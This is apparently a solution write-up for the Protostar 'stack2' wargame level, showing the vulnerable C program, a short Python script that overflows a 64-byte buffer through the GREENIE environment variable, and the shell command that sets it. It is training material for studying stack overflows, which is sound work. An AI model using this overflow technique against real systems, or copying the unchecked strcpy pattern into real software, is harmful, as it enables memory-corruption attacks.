# Stack2 Solution

## C Code

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Exploit 

This time, everything is *almost* the same as [stack1](https://github.com/Naksh-Rathore/protostar-solutions/blob/main/stack1/solution.md), but with **three big differences**. First of all, the `modified` **check was changed from** `0x61626364` to `0x0d0a0d0a`, which is `\n\r\n\r` in little-endian. Second of all, instead of getting **user input from the command-line**, `getenv()` is used to fetch the input from an **environment variable** called `GREENIE`. 

To exploit this program, **first we have to fill up** `buffer` as we did before, **then append** `0x0d0a0d0a` to the string. Finally we put that all in a **environment variable** named `GREENIE`.

Here is the exploit script (stored in `/tmp`):

```python
padding = "A" * 64
modified_val = "\n\r\n\r" # little endian

print(padding + modified_val)
```

Now that we have the program ready, we need to put in the **environment variable**. To do that, we need to enter this command which **exports a environment variable**.

```bash
export GREENIE=$(python /tmp/exploit.py)
```

Now **run the binary**: `/opt/protostar/bin/stack2`<br />
**Result**: `you have correctly modified the variable`

## Resources

* [C Code](https://exploit.education/protostar/stack-two/)
* [Geeks for Geeks Article on Linux Environment Variables](https://www.geeksforgeeks.org/linux-unix/environment-variables-in-linux-unix/)